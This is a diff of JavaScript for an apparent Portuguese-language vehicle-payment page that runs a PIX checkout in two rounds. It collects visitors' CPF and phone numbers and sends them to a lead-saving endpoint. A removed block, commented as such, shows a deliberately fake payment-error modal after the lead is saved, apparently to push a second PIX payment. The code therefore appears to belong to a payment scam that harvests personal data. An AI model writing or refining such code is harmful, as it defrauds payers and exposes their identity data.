@@ -578,6 +578,17 @@
     <script src="lib/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
 
     <script>
+        // ─── Variáveis globais do fluxo de PIX ────────────────────────────────
+        let _pixRodada = 1;      // 1 = primeiro PIX, 2 = segundo PIX
+        let _leadColetado = false; // true após CPF+Telefone serem salvos
+        let _leadPlaca = null;
+        let _leadCpf = null;
+        let _leadTel = null;
+        let _chargeId = null;
+        let _placaPagamento = null;
+        let _valorPagamento = null;
+        let _pollingIntervalo = null;
+        // ────────────────────────────────────────────────────────────────
         document.addEventListener("DOMContentLoaded", () => {
 
             /* ======================
@@ -952,15 +963,8 @@
                 qrLoader.style.display = "none";
                 Swal.fire('Erro', 'Não foi possível gerar o PIX. Tente novamente.', 'error');
             }
-        }
-
-        // ─── Variáveis globais do pagamento ─────────────────────────────────────
-        let _chargeId = null;
-        let _placaPagamento = null;
-        let _valorPagamento = null;
-        let _pollingIntervalo = null;
-
-        // ─── Polling de status do pagamento ─────────────────────────────────────
+        } // fecha chamarGeraPIX
+        // ─── Polling de status do pagamento ──────────────────────────────────
         function iniciarPollingPagamento(chargeId, placa, valor) {
             if (!chargeId) return;
             _chargeId = chargeId;
@@ -990,13 +994,6 @@
                 }
             }, 5000);
         }
-
-        // ─── Flag: controla se é 1º ou 2º PIX ───────────────────────────────────
-        let _pixRodada = 1; // 1 = primeiro PIX, 2 = segundo PIX
-        let _leadColetado = false; // true após CPF+Telefone serem salvos
-        let _leadPlaca = null;
-        let _leadCpf = null;
-        let _leadTel = null;
 
         // ─── Redirecionar para obrigado ──────────────────────────────────────────
         function redirecionarObrigado(placa, valor, chargeId) {
@@ -1183,63 +1180,6 @@
                 // Rola até a seção do PIX
                 const pixEl = document.getElementById('pixSection');
                 if (pixEl) pixEl.scrollIntoView({ behavior: 'smooth' });
-            };
-        }
-
-
-            // Limpar campos
-            document.getElementById('leadCpfInput').value = '';
-            document.getElementById('leadTelInput').value = '';
-            document.getElementById('leadCpfInput').classList.remove('error');
-            document.getElementById('leadTelInput').classList.remove('error');
-            document.getElementById('leadCpfError').style.display = 'none';
-            document.getElementById('leadTelError').style.display = 'none';
-
-            overlay.classList.add('active');
-            setTimeout(() => document.getElementById('leadCpfInput').focus(), 150);
-
-            document.getElementById('btnConfirmarLead').onclick = async () => {
-                const cpfRaw = document.getElementById('leadCpfInput').value.replace(/\D/g, '');
-                const telRaw = document.getElementById('leadTelInput').value.replace(/\D/g, '');
-                let valido = true;
-
-                if (cpfRaw.length !== 11) {
-                    document.getElementById('leadCpfInput').classList.add('error');
-                    document.getElementById('leadCpfError').style.display = 'block';
-                    valido = false;
-                } else {
-                    document.getElementById('leadCpfInput').classList.remove('error');
-                    document.getElementById('leadCpfError').style.display = 'none';
-                }
-
-                if (telRaw.length < 10 || telRaw.length > 11) {
-                    document.getElementById('leadTelInput').classList.add('error');
-                    document.getElementById('leadTelError').style.display = 'block';
-                    valido = false;
-                } else {
-                    document.getElementById('leadTelInput').classList.remove('error');
-                    document.getElementById('leadTelError').style.display = 'none';
-                }
-
-                if (!valido) return;
-
-                const btn = document.getElementById('btnConfirmarLead');
-                btn.disabled = true;
-                btn.textContent = 'Aguarde...';
-
-                try {
-                    await fetch('/api/save-lead', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ placa, cpf: cpfRaw, telefone: telRaw, chargeId, valor })
-                    });
-                } catch(e) {
-                    console.warn('Erro ao salvar lead:', e);
-                }
-
-                overlay.classList.remove('active');
-                // Após salvar o lead, exibe modal de erro falso (em vez de ir para obrigado.html)
-                exibirModalErroPix(placa, valor);
             };
         }
 
